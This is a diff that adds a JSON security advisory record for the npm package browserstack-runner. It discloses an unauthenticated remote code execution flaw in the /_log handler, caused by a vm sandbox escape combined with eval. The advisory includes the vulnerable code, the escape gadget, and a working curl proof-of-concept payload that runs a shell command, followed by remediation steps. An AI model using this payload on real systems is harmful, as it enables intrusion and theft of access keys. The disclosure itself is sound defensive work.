@@ -1,0 +1,56 @@
+{
+  "Severity": "HIGH",
+  "UpdatedAt": "2026-06-03T21:39:33Z",
+  "Package": {
+    "Ecosystem": "NPM",
+    "Name": "browserstack-runner"
+  },
+  "Advisory": {
+    "DatabaseId": 360533,
+    "Id": "GSA_kwCzR0hTQS02dnIzLTd3Y3gtdjVnNc4ABYBV",
+    "GhsaId": "GHSA-6vr3-7wcx-v5g5",
+    "References": [
+      {
+        "Url": "https://github.com/browserstack/browserstack-runner/security/advisories/GHSA-6vr3-7wcx-v5g5"
+      },
+      {
+        "Url": "https://nvd.nist.gov/vuln/detail/CVE-2026-49143"
+      },
+      {
+        "Url": "https://www.vulncheck.com/advisories/browserstack-runner-unauthenticated-rce-via-log-http-handler"
+      },
+      {
+        "Url": "https://github.com/advisories/GHSA-6vr3-7wcx-v5g5"
+      }
+    ],
+    "Identifiers": [
+      {
+        "Type": "GHSA",
+        "Value": "GHSA-6vr3-7wcx-v5g5"
+      },
+      {
+        "Type": "CVE",
+        "Value": "CVE-2026-49143"
+      }
+    ],
+    "Description": "### Summary\n\nThe HTTP handler `/_log` in `lib/server.js` (lines 491–515) of browserstack-runner passes unauthenticated user-supplied data to `vm.runInNewContext()` combined with `eval()`, enabling a sandbox escape and arbitrary code execution on the host system.\n\n### Details\n\nWhen `browserstack-runner` starts, it creates an HTTP server on port 8888 (configurable) that listens on all network interfaces (`0.0.0.0`). The `/_log` endpoint accepts POST requests and processes the JSON body as follows:\n\n```javascript\n// lib/server.js lines 504-510\nvar context = { input: query.arguments, format: util.format, output: '' };\nvar tryEvalOrString = 'function (arg) { try { return eval(\\'o = \\' + arg); } catch (e) { return arg; } }';\nvm.runInNewContext('output = format.apply(null, input.map(' + tryEvalOrString + '));', context);\n```\n\nThe `vm` module is [not a security mechanism](https://nodejs.org/api/vm.html#vm-executing-javascript) per Node.js documentation. The `context` object contains a reference to `util.format` (a host-context Function), enabling sandbox escape via `this.constructor.constructor(\"return process\")()`.\n\nUnlike the `_progress` and `_report` handlers which verify worker UUID authentication, the `_log` handler does not gate on authentication.\n\n### Proof of Concept\n\n```bash\n# Terminal 1: start the runner\necho '\u003chtml\u003e\u003cbody\u003et\u003c/body\u003e\u003c/html\u003e' \u003e t.html\necho '{\"username\":\"X\",\"key\":\"X\",\"test_path\":\"t.html\",\"test_framework\":\"qunit\",\"browsers\":[]}' \u003e browserstack.json\nnode bin/runner.js\n\n# Terminal 2: exploit\ncurl -s http://127.0.0.1:8888/_log \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"arguments\":[\"this.constructor.constructor(\\\"return process.mainModule.require(\\`child_process\\`).execSync(\\`id\\`).toString()\\\")()\"]}'\n\n# Terminal 1 output shows:\n# [undefined] uid=1000(user) gid=1000(user) ...\n```\n\n### Impact\n\nAn attacker on the same network as a developer running `browserstack-runner` can execute arbitrary commands on the developer's machine without authentication. The attack window exists for the duration of the test run (typically 1–15 minutes). The BrowserStack access key is accessible in the same process context via environment variables.\n\n### Remediation\n\n1. Remove `eval()` and `vm.runInNewContext()` from the `_log` handler — use `JSON.stringify()` for safe logging\n2. Add UUID authentication to `_log` (matching `_progress` and `_report` handlers)\n3. Bind the HTTP server on `127.0.0.1` instead of `0.0.0.0`\n\n### Credit\n\nChrist Bowel Bouchuen",
+    "Origin": "UNSPECIFIED",
+    "PublishedAt": "2026-06-03T21:39:32Z",
+    "Severity": "HIGH",
+    "Summary": "browserstack-runner vulnerable to Remote Code Execution via vm sandbox escape in _log HTTP handler",
+    "UpdatedAt": "2026-06-03T21:39:33Z",
+    "WithdrawnAt": "",
+    "CVSS": {
+      "Score": 8.8,
+      "VectorString": "CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
+    }
+  },
+  "Versions": [
+    {
+      "FirstPatchedVersion": {
+        "Identifier": ""
+      },
+      "VulnerableVersionRange": "\u003c= 0.9.5"
+    }
+  ]
+}
